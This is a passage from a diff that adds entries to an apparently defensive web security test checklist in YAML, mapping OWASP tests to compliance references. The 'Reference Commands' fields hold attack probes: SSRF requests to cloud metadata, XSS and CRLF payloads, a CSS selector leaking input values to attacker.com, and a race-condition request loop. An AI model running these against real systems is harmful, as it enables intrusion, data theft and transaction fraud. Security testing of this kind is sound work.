+          - "Objective: Test input fields for buffer overflow conditions (legacy/native apps)."
+          - "Identify native/legacy components accepting input."
+          - "Send oversized/malformed input."
+          - "Monitor for crash/memory corruption."
+          - "Expected Secure Result: Application handles oversized input gracefully; no crash/memory corruption."
+          - "Reference Commands: python3 -c \"print('A'*5000)\" | nc target.com 9999"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-12"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-12"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-013"
+        title: "[WSTG-INPV-13] Test for Format String Injection"
+        category: "Input Validation Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for format string vulnerabilities in native code components."
+          - "Identify components using format functions (printf-like)."
+          - "Inject format specifiers."
+          - "Observe crash/memory leak."
+          - "Expected Secure Result: Application not vulnerable to format string attacks."
+          - "Reference Commands: %x%x%x%x%n | %s%s%s%s"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-13"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-13"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-014"
+        title: "[WSTG-INPV-14] Test for Incubated Vulnerability"
+        category: "Input Validation Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test multi-step attacks where injected payload is stored and later triggered elsewhere."
+          - "Upload/store a malicious payload (e.g. file with embedded script)."
+          - "Identify secondary process/admin panel that processes it."
+          - "Confirm delayed execution/impact."
+          - "Expected Secure Result: Stored payloads sanitized before processing in any downstream component."
+          - "Reference Commands: Upload malicious .svg/.xml with embedded payload; monitor admin review panel behavior"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-14"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-14"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-015"
+        title: "[WSTG-INPV-15] Test for HTTP Splitting/Smuggling"
+        category: "Input Validation Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for CRLF injection enabling response splitting or request smuggling."
+          - "Inject CRLF sequences in headers/params."
+          - "Test front-end/back-end desync (Content-Length vs Transfer-Encoding)."
+          - "Confirm smuggling with timing/differential responses."
+          - "Expected Secure Result: No CRLF injection possible; front-end/back-end parsing consistent, no smuggling."
+          - "Reference Commands: curl 'https://target.com/redirect?url=%0d%0aSet-Cookie:%20malicious=true' | smuggler.py -u https://target.com | Burp HTTP Request Smuggler extension"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-15"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-15"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-016"
+        title: "[WSTG-INPV-16] Test for Host Header Injection"
+        category: "Input Validation Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test if Host header can be manipulated to affect app logic (password reset, cache poisoning)."
+          - "Send request with modified/arbitrary Host header."
+          - "Test on password reset link generation."
+          - "Test cache poisoning via X-Forwarded-Host."
+          - "Expected Secure Result: Application validates Host header against allow-list; not used unsafely in links/cache."
+          - "Reference Commands: curl https://target.com/ -H 'Host: evil.com' | curl https://target.com/reset -H 'X-Forwarded-Host: evil.com'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-16"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-16"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-017"
+        title: "[WSTG-INPV-17] Test for Server-Side Request Forgery (SSRF)"
+        category: "Input Validation Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_ssrf"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test if server can be tricked into making requests to internal/arbitrary resources."
+          - "Identify parameters accepting URLs (webhook, import, fetch)."
+          - "Inject internal/cloud-metadata URLs."
+          - "Confirm via out-of-band callback (Burp Collaborator)."
+          - "Expected Secure Result: URL-fetching functionality restricted to allow-listed destinations; internal/metadata IPs blocked."
+          - "Reference Commands: curl 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/' | curl 'https://target.com/fetch?url=http://internal-service:8080' | Burp Collaborator client for OOB confirmation"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Input Validation & Sanitization)"
+            - "CERT-In CISG-2026-02 (Defending Against Automated & AI-Assisted Exploitation)"
+            - "OWASP WSTG v4.2: WSTG-INPV-17"
+          global:
+            - "OWASP WSTG v4.2: WSTG-INPV-17"
+            - "OWASP Top 10: A03 Injection / A10 SSRF"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.25, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-018"
+        title: "[WSTG-CLNT-01] Test for DOM-based Cross Site Scripting"
+        category: "Client-Side Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Identify DOM XSS via client-side JS processing of untrusted data."
+          - "Review JS source for sinks (innerHTML, eval, document.write)."
+          - "Trace tainted sources (location.hash, URL params) to sinks."
+          - "Craft payload to trigger execution."
+          - "Expected Secure Result: No untrusted data flows into dangerous DOM sinks without sanitization."
+          - "Reference Commands: https://target.com/page#<img src=x onerror=alert(1)> | DOM Invader (Burp extension) for automated sink/source tracing"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-01"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-019"
+        title: "[WSTG-CLNT-02] Test for JavaScript Execution"
+        category: "Client-Side Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify client-side JS can't be manipulated to execute arbitrary code."
+          - "Review JS for insecure eval()/Function() usage on user input."
+          - "Attempt injection via manipulable inputs."
+          - "Expected Secure Result: No arbitrary JS execution possible via user-controlled input."
+          - "Reference Commands: Manual JS source review; browser console testing"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-02"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-020"
+        title: "[WSTG-CLNT-03] Test HTML Injection"
+        category: "Client-Side Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify user input can't inject arbitrary HTML altering page structure."
+          - "Inject HTML tags into input fields."
+          - "Observe if rendered unsanitized in the DOM."
+          - "Expected Secure Result: HTML input properly encoded/sanitized on output."
+          - "Reference Commands: <h1>Injected</h1> | <iframe src='https://evil.com'></iframe>"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-03"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-021"
+        title: "[WSTG-CLNT-04] Test for Client-Side URL Redirect (Open Redirect)"
+        category: "Client-Side Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify redirect functionality can't be abused for phishing."
+          - "Identify redirect parameters."
+          - "Modify to external/malicious URL."
+          - "Test bypass with schema tricks (//evil.com, @evil.com)."
+          - "Expected Secure Result: Redirects restricted to allow-listed/relative internal URLs only."
+          - "Reference Commands: curl -I 'https://target.com/redirect?url=https://evil.com' | curl -I 'https://target.com/redirect?next=//evil.com'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-04"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-022"
+        title: "[WSTG-CLNT-05] Test for CSS Injection"
+        category: "Client-Side Testing"
+        severity: "Low"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify CSS injection can't be used for data exfiltration/UI redressing."
+          - "Identify CSS input vectors (custom themes)."
+          - "Inject CSS with data-exfil selectors (attribute selectors leaking input values)."
+          - "Expected Secure Result: CSS input sanitized; no attribute-selector data exfiltration possible."
+          - "Reference Commands: input[value^='a']{background:url(https://attacker.com/leak?a)}"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-05"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-05"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-023"
+        title: "[WSTG-CLNT-06] Test for Client-Side Resource Manipulation"
+        category: "Client-Side Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify client-side resource references (scripts, iframes) can't be manipulated."
+          - "Identify parameters controlling resource loading (src attributes)."
+          - "Attempt to point to attacker-controlled resource."
+          - "Expected Secure Result: Resource references validated/allow-listed; cannot be pointed to external attacker resources."
+          - "Reference Commands: curl 'https://target.com/page?script=https://evil.com/malicious.js'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-06"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-06"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-024"
+        title: "[WSTG-CLNT-07] Test Cross Origin Resource Sharing (CORS)"
+        category: "Client-Side Testing"
+        severity: "High"
+        execution_mode: "automated"
+        tool_binding: ["httpx_cors"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify CORS policy doesn't allow untrusted origins with credentials."
+          - "Send request with arbitrary Origin header."
+          - "Check Access-Control-Allow-Origin/Allow-Credentials response."
+          - "Test reflection of arbitrary origin."
+          - "Expected Secure Result: CORS restricted to trusted origins only; ACAO not reflecting arbitrary origins with credentials true."
+          - "Reference Commands: curl -I https://target.com/api/data -H 'Origin: https://evil.com'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-07"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-07"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-025"
+        title: "[WSTG-CLNT-08] Test for Cross Site Flashing"
+        category: "Client-Side Testing"
+        severity: "Low"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test legacy Flash components for cross-domain vulnerabilities (if present)."
+          - "Identify any Flash (.swf) components."
+          - "Decompile and review ActionScript for insecure cross-domain calls."
+          - "Expected Secure Result: No Flash components present, or cross-domain policies properly restricted."
+          - "Reference Commands: swfdump -D file.swf | JPEXS Free Flash Decompiler"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-08"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-08"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-026"
+        title: "[WSTG-CLNT-09] Test for Clickjacking"
+        category: "Client-Side Testing"
+        severity: "Medium"
+        execution_mode: "automated"
+        tool_binding: ["httpx_headers"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify app can't be embedded in a malicious iframe for UI redress attacks."
+          - "Check X-Frame-Options / frame-ancestors CSP directive."
+          - "Attempt to embed target page in a test iframe."
+          - "Expected Secure Result: X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors set appropriately."
+          - "Reference Commands: curl -I https://target.com | grep -i x-frame-options | <iframe src='https://target.com'></iframe> (PoC test page)"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-09"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-09"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-027"
+        title: "[WSTG-CLNT-10] Test WebSockets"
+        category: "Client-Side Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify WebSocket connections enforce origin checks and proper auth."
+          - "Identify WebSocket endpoints (wss://)."
+          - "Test connection from unauthorized origin."
+          - "Test for injection in WS messages."
+          - "Expected Secure Result: WebSocket validates Origin header and authentication; input sanitized."
+          - "Reference Commands: wscat -c wss://target.com/socket | Burp Suite - WebSocket history/manipulation"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-10"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-10"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-028"
+        title: "[WSTG-CLNT-11] Test Web Messaging"
+        category: "Client-Side Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify postMessage() implementation validates origin properly."
+          - "Review JS for window.postMessage/onmessage usage."
+          - "Check if origin is validated on receipt."
+          - "Craft malicious page sending forged messages."
+          - "Expected Secure Result: postMessage handlers validate event.origin against an allow-list before processing."
+          - "Reference Commands: window.postMessage('malicious_payload','*') from attacker-controlled page"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-11"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-11"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-INJ-029"
+        title: "[WSTG-CLNT-12] Test Local Storage"
+        category: "Client-Side Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify sensitive data isn't stored insecurely in localStorage/sessionStorage."
+          - "Login and inspect Local Storage/Session Storage/IndexedDB."
+          - "Check for tokens/PII stored in plaintext."
+          - "Expected Secure Result: No sensitive data (tokens, PII, credentials) stored in plaintext in browser storage."
+          - "Reference Commands: Browser DevTools > Application > Local Storage"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Browser & Client-Side Security Controls)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) (Preventing Client-Side PII Exposure)"
+            - "OWASP WSTG v4.2: WSTG-CLNT-12"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CLNT-12"
+            - "OWASP Top 10: A03 Injection / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4, 6.4.3"
+            - "ISO 27001:2022: A.8.26, A.8.28"
+            - "SOC 2: CC7.1"
+
+  - module_id: "TIR-LOGIC"
+    name: "Business Logic, Error Handling & File Security Engine"
+    checks:
+      - id: "WEB-LOG-001"
+        title: "[WSTG-ERRH-01] Test for Improper Error Handling"
+        category: "Error Handling"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify error messages don't disclose stack traces/internal paths."
+          - "Trigger errors with malformed input."
+          - "Trigger 404/500 responses."
+          - "Review error content for stack traces/version info."
+          - "Expected Secure Result: Generic error messages returned; no stack traces, paths, or version data disclosed."
+          - "Reference Commands: curl https://target.com/nonexistent-page | curl -X POST https://target.com/api -d 'malformed{{json'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Safe Error Handling & Stack Trace Suppression)"
+            - "CERT-In CISG-2026-02 (Preventing Information Disclosure)"
+            - "OWASP WSTG v4.2: WSTG-ERRH-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ERRH-01"
+            - "OWASP Top 10: A04 Insecure Design / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-LOG-002"
+        title: "[WSTG-ERRH-02] Test for Stack Traces"
+        category: "Error Handling"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Specifically verify stack traces aren't leaked in responses."
+          - "Force exceptions via invalid data types/large inputs."
+          - "Review response body/headers for stack trace content."
+          - "Expected Secure Result: No stack traces present in any HTTP response, including 500 errors."
+          - "Reference Commands: curl -X POST https://target.com/api/data -d '{\"id\":\"not_a_number\"}'"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Safe Error Handling & Stack Trace Suppression)"
+            - "CERT-In CISG-2026-02 (Preventing Information Disclosure)"
+            - "OWASP WSTG v4.2: WSTG-ERRH-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ERRH-02"
+            - "OWASP Top 10: A04 Insecure Design / A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: CC7.1"
+
+      - id: "WEB-LOG-003"
+        title: "[WSTG-BUSL-01] Test Business Logic Data Validation"
+        category: "Business Logic Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["bfsi_fintech", "ecommerce", "saas_multitenant"]
+        test_procedures:
+          - "Objective: Verify business rules enforced server-side, not just client-side."
+          - "Identify business rules (e.g. price, quantity limits)."
+          - "Bypass client-side validation via proxy."
+          - "Submit out-of-range/invalid values."
+          - "Expected Secure Result: All business rules enforced server-side; invalid values rejected."
+          - "Reference Commands: Burp Repeater - modify price/quantity params directly, bypassing JS validation"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-01"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+      - id: "WEB-LOG-004"
+        title: "[WSTG-BUSL-02] Test Ability to Forge Requests"
+        category: "Business Logic Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify requests can't be forged to skip required steps in multi-step workflows."
+          - "Map the intended multi-step workflow."
+          - "Attempt to skip steps by directly calling later-stage endpoints."
+          - "Expected Secure Result: Each workflow step validated server-side; steps cannot be skipped/forged."
+          - "Reference Commands: curl -X POST https://target.com/checkout/complete (skipping payment step)"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-02"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+      - id: "WEB-LOG-005"
+        title: "[WSTG-BUSL-03] Test Integrity Checks"
+        category: "Business Logic Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["bfsi_fintech", "ecommerce", "saas_multitenant"]
+        test_procedures:
+          - "Objective: Verify data integrity checks prevent tampering (e.g. price/discount manipulation)."
+          - "Intercept a transaction request."
+          - "Modify price/discount/total fields."
+          - "Submit and observe if manipulated value is accepted."
+          - "Expected Secure Result: Server recalculates/validates all pricing server-side; tampered values rejected."
+          - "Reference Commands: Burp Repeater - modify {'price':0.01} in checkout request"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-03"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+      - id: "WEB-LOG-006"
+        title: "[WSTG-BUSL-04] Test for Process Timing"
+        category: "Business Logic Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["bfsi_fintech", "ecommerce", "saas_multitenant"]
+        test_procedures:
+          - "Objective: Test for timing-based logic abuse (race conditions in workflows)."
+          - "Identify time-sensitive processes (coupon redemption, voting)."
+          - "Send rapid concurrent requests."
+          - "Observe if timing gives unintended advantage."
+          - "Expected Secure Result: No exploitable timing/race condition in business processes."
+          - "Reference Commands: Burp Turbo Intruder for race condition testing | for i in {1..20}; do curl -X POST https://target.com/redeem & done"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-04"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+      - id: "WEB-LOG-007"
+        title: "[WSTG-BUSL-05] Test Number of Times a Function Can Be Used Limits"
+        category: "Business Logic Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["bfsi_fintech", "ecommerce", "saas_multitenant"]
+        test_procedures:
+          - "Objective: Verify usage limits are enforced (coupon single-use, vote-once, submission limits)."
+          - "Identify functions with intended usage limits."
+          - "Attempt to reuse/repeat beyond limit via replay/race condition."
+          - "Expected Secure Result: Usage limits enforced atomically server-side; cannot be exceeded via replay/race conditions."
+          - "Reference Commands: Burp Repeater - replay coupon redemption request multiple times | Burp Turbo Intruder - concurrent replay for race condition"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Transaction Integrity & Anti-Tampering)"
+            - "CERT-In CISG-2024-01 (Secure Business Logic & File Upload Controls)"
+            - "OWASP WSTG v4.2: WSTG-BUSL-05"
+          global:
+            - "OWASP WSTG v4.2: WSTG-BUSL-05"
+            - "OWASP Top 10: A04 Insecure Design"
+            - "PCI DSS v4.0: Req. 6.2.4"
+            - "ISO 27001:2022: A.8.26"
+            - "SOC 2: PI1.1"
+
+      - id: "WEB-LOG-008"
+        title: "[WSTG-BUSL-06] Test for Circumvention of Workflows"
+        category: "Business Logic Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
